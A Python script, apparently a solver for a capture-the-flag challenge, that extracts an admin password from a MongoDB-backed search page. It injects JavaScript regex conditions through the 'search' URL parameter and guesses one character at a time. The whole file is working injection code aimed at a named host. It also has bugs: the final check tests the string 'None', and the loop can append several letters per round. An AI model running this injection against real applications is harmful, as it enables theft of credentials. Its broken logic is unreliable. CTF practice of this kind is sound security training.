import requests
import re

"""
 A simple script to loop over character set and bruteforce password for a CTF mongoDB server
 URL is specific to CTF instance
"""

url = 'http://ptl-ec031926-acc9d843.libcurl.st/?search=admin%27%20%26%26%20this.password.match'

letter_range = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-")

password_list = []

def mongo_password_cracker(previous_result=None):
    for letter in letter_range:
        _password_checker(letter)
    if not _full_password_found():
        mongo_password_cracker()

def _password_checker(letter):
    regex = "(/^{}.*$/)%00".format(_regex_builder(letter))
    intermediary_url = url + regex

    if _submit_password(intermediary_url):
        print("admin found: intermediary_url is {}".format(intermediary_url))
        password_list.append(letter)
        print(password_list)
        if _full_password_found():
            return True
        return False
    return False

def _regex_builder(letter):
    password_list_to_use = ('').join(password_list)
    if letter:
        return password_list_to_use + letter


def _full_password_found():
    full_password_regex = "(/^{}$/)%00".format(_regex_builder(None))
    full_pw_url = url + full_password_regex
    final_password_found = _submit_password(full_pw_url)

    if final_password_found:
        print("final pw found: ")
        print(('').join(password_list))
        return True
    return False

def _submit_password(url):
    print("making call with url {}".format(url))
    resp = requests.get(url)
    contains_admin = re.findall(">admin<", resp.text)
    if contains_admin:
        return True
    return False

mongo_password_cracker()
